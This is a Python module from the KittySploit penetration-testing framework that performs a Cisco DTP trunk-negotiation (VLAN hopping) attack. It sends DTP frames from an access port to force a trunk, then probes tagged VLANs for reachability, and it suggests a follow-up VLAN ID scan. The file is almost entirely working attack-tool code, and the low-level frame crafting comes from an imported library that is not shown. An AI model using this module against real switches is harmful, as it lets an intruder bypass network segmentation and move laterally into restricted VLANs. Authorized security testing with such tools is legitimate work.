#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Negotiate an 802.1Q trunk via Cisco DTP from an access port."""

from __future__ import annotations

import json

from kittysploit import *
from lib.protocols.vlan.vlan_client import Vlan_client


class Module(Auxiliary, Vlan_client):
    __info__ = {
        "name": "VLAN DTP Trunk Negotiation",
        "description": (
            "Attempt to convert an access port into an 802.1Q trunk by sending Cisco "
            "DTP negotiation frames (desirable/on/auto), then verify tagged VLAN reachability."
        ),
        "author": ["KittySploit Team"],
        "tags": ["vlan", "dtp", "trunk", "cisco", "802.1q", "hop", "network"],
        "references": [
            "https://attack.mitre.org/techniques/T1599/",
            "Cisco DTP",
        ],
        "attack": {
            "tactics": ["TA0011", "Command and Control"],
            "techniques": ["T1599"],
            "prerequisites": [
                "Layer-2 access port on a Cisco switch with DTP enabled",
                "Ethernet interface with raw frame injection (CAP_NET_RAW / root)",
                "Authorized assessment scope",
            ],
            "detections": [
                "DTP negotiation frames from non-switch endpoints",
                "Access port transitioned to trunk",
            ],
            "artifacts": [
                "Switch DTP/syslog events",
                "Tagged DHCP probes after trunk establishment",
            ],
        },
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "lateral_movement"],
            "expected_requests": 5,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "tech_hints", "evidence"],
            "cost": 2.0,
            "noise": 0.95,
            "value": 1.6,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": [],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [{"capability": "vlan_access", "from_detail": "trunk"}],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": ["auxiliary/scanner/vlan/id_scan"],
            },
        },
    }

    negotiation = OptChoice(
        "desirable",
        "DTP negotiation mode sent to the switch",
        required=False,
        choices=["desirable", "on", "auto", "negotiate"],
    )
    duration = OptFloat(10.0, "Seconds to transmit DTP negotiation frames", required=False)
    interval = OptFloat(2.0, "Seconds between DTP frames", required=False)
    verify_vlans = OptBool(True, "Probe tagged DHCP on VLAN IDs after DTP", required=False)
    vlan_start = OptInteger(1, "First VLAN ID to verify after DTP", required=False)
    vlan_end = OptInteger(32, "Last VLAN ID to verify after DTP", required=False)
    vlan_list = OptString(
        "",
        "Explicit VLAN list/ranges to verify (overrides VLAN_START/VLAN_END)",
        required=False,
    )
    per_vlan_timeout = OptFloat(0.6, "Seconds to wait per VLAN during verification", required=False)
    output_file = OptString("", "Optional JSON output path", required=False)

    def check(self):
        if not self.vlan_require_scapy():
            print_error("scapy is not installed. Install it with: pip install scapy")
            return False
        if not self._iface():
            print_error("Interface is required")
            return False
        return True

    def run(self):
        iface = self._iface() or "eth0"
        negotiation = str(self.negotiation or "desirable").strip().lower()
        duration = max(1.0, float(self.duration or 10.0))
        interval = max(0.5, float(self.interval or 2.0))

        print_info(f"DTP trunk negotiation on {iface}")
        print_info(f"Mode: {negotiation} | Duration: {duration:.1f}s | Interval: {interval:.1f}s")
        print_info("=" * 72)

        verify_ids = None
        if bool(self.verify_vlans):
            verify_ids = list(
                self.vlan_iter_ids(
                    int(self.vlan_start or 1),
                    int(self.vlan_end or 32),
                    str(self.vlan_list or ""),
                )
            )
            print_info(f"Post-DTP verification across {len(verify_ids)} VLAN ID(s)")

        try:
            result = self.vlan_dtp_trunk_negotiate(
                negotiation=negotiation,
                duration=duration,
                interval=interval,
                verify_vlan_ids=verify_ids,
                iface=iface,
                per_vlan_timeout=max(0.2, float(self.per_vlan_timeout or 0.6)),
            )
        except PermissionError:
            print_error(f"Permission denied on {iface} — run as root or grant CAP_NET_RAW")
            return False
        except OSError as exc:
            print_error(f"DTP negotiation failed on {iface}: {exc}")
            return False

        print_info(f"DTP frames sent: {result.frames_sent}")

        if result.dtp_responses:
            print_success(f"DTP responses observed: {len(result.dtp_responses)}")
            for item in result.dtp_responses:
                parts = [item.get("source_mac", "")]
                if item.get("status"):
                    parts.append(f"status={item['status']}")
                if item.get("negotiation"):
                    parts.append(f"mode={item['negotiation']}")
                if item.get("domain"):
                    parts.append(f"domain={item['domain']}")
                if item.get("neighbor"):
                    parts.append(f"neighbor={item['neighbor']}")
                print_info("  " + " | ".join(part for part in parts if part))
        else:
            print_info("No DTP responses captured")

        if result.verified_vlans:
            print_success(f"Tagged VLAN reachability confirmed on {len(result.verified_vlans)} VLAN(s)")
            for hit in result.verified_vlans:
                detail = f" | {hit.detail}" if hit.detail else ""
                print_info(f"  VLAN {hit.vlan_id}{detail}")

        print_info("=" * 72)
        payload = {
            "interface": iface,
            "negotiation": negotiation,
            "frames_sent": result.frames_sent,
            "trunk_negotiated": result.trunk_negotiated,
            "detail": result.detail,
            "dtp_responses": result.dtp_responses,
            "verified_vlans": [
                {
                    "vlan_id": hit.vlan_id,
                    "method": hit.method,
                    "detail": hit.detail,
                    "source": hit.source,
                }
                for hit in result.verified_vlans
            ],
        }

        if result.trunk_negotiated:
            print_success(f"Trunk negotiation likely successful — {result.detail}")
            print_info("Follow up with auxiliary/scanner/vlan/id_scan to map all VLAN IDs")
        else:
            print_warning(f"Trunk negotiation failed — {result.detail}")
            print_info("The port may have DTP disabled (switchport nonegotiate) or be non-Cisco")

        output_file = str(self.output_file or "").strip()
        if output_file:
            try:
                with open(output_file, "w", encoding="utf-8") as handle:
                    json.dump(payload, handle, indent=2)
                print_success(f"Results saved to {output_file}")
            except OSError as exc:
                print_warning(f"Could not write output file: {exc}")

        return result.trunk_negotiated
